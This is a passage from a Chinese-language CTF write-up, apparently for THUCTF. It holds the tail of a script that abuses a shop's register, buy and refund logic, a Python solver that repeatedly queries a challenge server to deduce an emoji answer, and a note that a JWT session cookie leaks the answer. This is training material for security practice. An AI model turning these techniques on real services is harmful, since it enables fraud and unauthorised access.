<span><span style="color: #403F53">    u </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">str</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">register</span><span style="color: #403F53">(</span><span style="color: #4876D6">u</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">login</span><span style="color: #403F53">(</span><span style="color: #4876D6">u</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">changerole</span><span style="color: #403F53">(</span><span style="color: #4876D6">u</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">buy</span><span style="color: #403F53">(</span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">buy</span><span style="color: #403F53">(</span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">1</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">21</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">refund</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #0C969B">buy</span><span style="color: #403F53">(</span><span style="color: #AA0982">2</span><span style="color: #403F53">)</span></span>
<span><span style="color: #0C969B">check</span><span style="color: #403F53">(</span><span style="color: #AA0982">21</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/vme50-flag.5b6caa9e.webp"><img srcset="/assets/vme50-flag.e811eed1.png" loading="lazy" src="/assets/vme50-flag.e811eed1.png" width="1112" height="102" alt="flag"></picture></p>
<h3 id="emodle" class="heading"><a href="#emodle" class="heading-anchor" aria-label="章节： Emodle" tabindex="-1"></a><span>Emodle</span></h3>
<h4 id="level-1-12" class="heading"><a href="#level-1-12" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>由于答案不变<span class="mojikumi-line-end">，</span>相当于可以进行无限次猜测<span class="mojikumi-line-end">。</span></p>
<p>可以从 <a href="https://unicode.org/Public/emoji/">https<wbr>://<wbr>unicode<wbr>.<wbr>org<wbr>/<wbr>Public<wbr>/<wbr>emoji<wbr>/</a> 下载 emoji 的 Unicode 列表<span class="mojikumi-line-end">，</span>然后首先猜若干次确认哪些 emoji 出现了<span class="mojikumi-line-end">，</span>然后对每个出现了的 emoji 猜一次全是这个 emoji 来确定其位置<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-22"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-22--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> re</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> requests</span></span>
<span></span>
<span><span style="color: #D6DEEB">port </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">50258</span></span>
<span><span style="color: #D6DEEB">url </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;http://chal.thuctf.redbud.info:</span><span style="color: #82AAFF">{</span><span style="color: #D6DEEB">port</span><span style="color: #82AAFF">}</span><span style="color: #ECC48D">/level1&quot;</span></span>
<span></span>
<span><span style="color: #D6DEEB">emojis </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span></span>
<span><span style="color: #C792EA">with</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">emoji-sequences.txt</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">as</span><span style="color: #D6DEEB"> seq:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> line </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> seq:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">line</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">or</span><span style="color: #D6DEEB"> line.</span><span style="color: #B2CCD6">startswith</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">#</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">        code </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> line.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">..</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> code:</span></span>
<span><span style="color: #D6DEEB">            l, r </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> code.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">..</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            l, r </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> code, code</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">l</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">r</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            emojis.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">chr</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span></span>
<span><span style="color: #D6DEEB">emojis </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">guess</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">g</span><span style="color: #D6DEEB">: </span><span style="color: #C5E478">str</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> requests.</span><span style="color: #B2CCD6">get</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">url</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">params</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">guess</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: g}</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    m </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> re.</span><span style="color: #B2CCD6">findall</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">results</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">.push</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">(&quot;([🟥🟨🟩]*)&quot;</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">)</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> res.text</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">    result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> m:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">🟥</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">r</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">elif</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">🟨</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">y</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">g</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> result</span></span>
<span></span>
<span></span>
<span><span style="color: #D6DEEB">answer </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">?</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">64</span></span>
<span><span style="color: #D6DEEB">charset </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">guess</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i : i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">])</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">&gt;=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> res[j] </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">r</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            charset.</span><span style="color: #B2CCD6">add</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> j</span><span style="color: #D6DEEB">])</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> e </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> charset:</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">guess</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">e </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> res[j] </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">g</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            answer[j] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> e</span></span>
<span></span>
<span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">answer</span><span style="color: #D6DEEB">))</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">import</span><span style="color: #403F53"> re</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> requests</span></span>
<span></span>
<span><span style="color: #403F53">port </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">50258</span></span>
<span><span style="color: #403F53">url </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;http://chal.thuctf.redbud.info:</span><span style="color: #4876D6">{</span><span style="color: #403F53">port</span><span style="color: #4876D6">}</span><span style="color: #C96765">/level1&quot;</span></span>
<span></span>
<span><span style="color: #403F53">emojis </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span></span>
<span><span style="color: #994CC3">with</span><span style="color: #403F53"> </span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">emoji-sequences.txt</span><span style="color: #111111">&quot;</span><span style="color: #403F53">) </span><span style="color: #994CC3">as</span><span style="color: #403F53"> seq:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> line </span><span style="color: #994CC3">in</span><span style="color: #403F53"> seq:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">line</span><span style="color: #403F53">) </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53"> </span><span style="color: #994CC3">or</span><span style="color: #403F53"> line.</span><span style="color: #0C969B">startswith</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">#</span><span style="color: #111111">&quot;</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">        code </span><span style="color: #994CC3">=</span><span style="color: #403F53"> line.</span><span style="color: #0C969B">split</span><span style="color: #403F53">()</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">..</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #994CC3">in</span><span style="color: #403F53"> code:</span></span>
<span><span style="color: #403F53">            l, r </span><span style="color: #994CC3">=</span><span style="color: #403F53"> code.</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">..</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            l, r </span><span style="color: #994CC3">=</span><span style="color: #403F53"> code, code</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">l</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> int</span><span style="color: #403F53">(</span><span style="color: #4876D6">r</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            emojis.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">chr</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">))</span></span>
<span></span>
<span></span>
<span><span style="color: #403F53">emojis </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">set</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">))</span></span>
<span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">guess</span><span style="color: #111111">(</span><span style="color: #0C969B">g</span><span style="color: #403F53">: </span><span style="color: #4876D6">str</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> requests.</span><span style="color: #0C969B">get</span><span style="color: #403F53">(</span><span style="color: #4876D6">url</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">params</span><span style="color: #994CC3">=</span><span style="color: #4876D6">{</span><span style="color: #111111">&quot;</span><span style="color: #C96765">guess</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: g}</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    m </span><span style="color: #994CC3">=</span><span style="color: #403F53"> re.</span><span style="color: #0C969B">findall</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">results</span><span style="color: #AA0982">\\</span><span style="color: #C96765">.push</span><span style="color: #AA0982">\\</span><span style="color: #C96765">(&quot;([🟥🟨🟩]*)&quot;</span><span style="color: #AA0982">\\</span><span style="color: #C96765">)</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> res.text</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">    result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> c </span><span style="color: #994CC3">in</span><span style="color: #403F53"> m:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> c </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">🟥</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">r</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">elif</span><span style="color: #403F53"> c </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">🟨</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">y</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">g</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> result</span></span>
<span></span>
<span></span>
<span><span style="color: #403F53">answer </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[</span><span style="color: #111111">&quot;</span><span style="color: #C96765">?</span><span style="color: #111111">&quot;</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">64</span></span>
<span><span style="color: #403F53">charset </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">set</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> len</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">guess</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">[</span><span style="color: #4876D6">i : i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">])</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">&gt;=</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> res[j] </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">r</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            charset.</span><span style="color: #0C969B">add</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">[</span><span style="color: #4876D6">i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> j</span><span style="color: #403F53">])</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> e </span><span style="color: #994CC3">in</span><span style="color: #403F53"> charset:</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">guess</span><span style="color: #403F53">(</span><span style="color: #4876D6">e </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> res[j] </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">g</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            answer[j] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> e</span></span>
<span></span>
<span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;&quot;</span><span style="color: #4876D6">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">answer</span><span style="color: #403F53">))</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/emodle-flag1.d81d3da2.webp"><img srcset="/assets/emodle-flag1.c00f75ce.png" loading="lazy" src="/assets/emodle-flag1.c00f75ce.png" width="1296" height="244" alt="flag1"></picture></p>
<h4 id="level-2-9" class="heading"><a href="#level-2-9" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>只猜 8 次基本上不可能猜出<span class="mojikumi-line-end">，</span>需要转换思路<span class="mojikumi-line-end">。</span>这是一道 Web 题<span class="mojikumi-line-end">，</span>所以看看它 Web 的部分<span class="mojikumi-line-end">。</span>注意到它有 session 功能<span class="mojikumi-line-end">，</span>通过 Cookie 实现<span class="mojikumi-line-end">，</span>而 Cookie 是 JWT<span class="mojikumi-line-end">，</span>payload 解码出来就包含了答案<span class="mojikumi-line-end">。</span>下面是一个例子<span class="mojikumi-line-end">：</span></p>
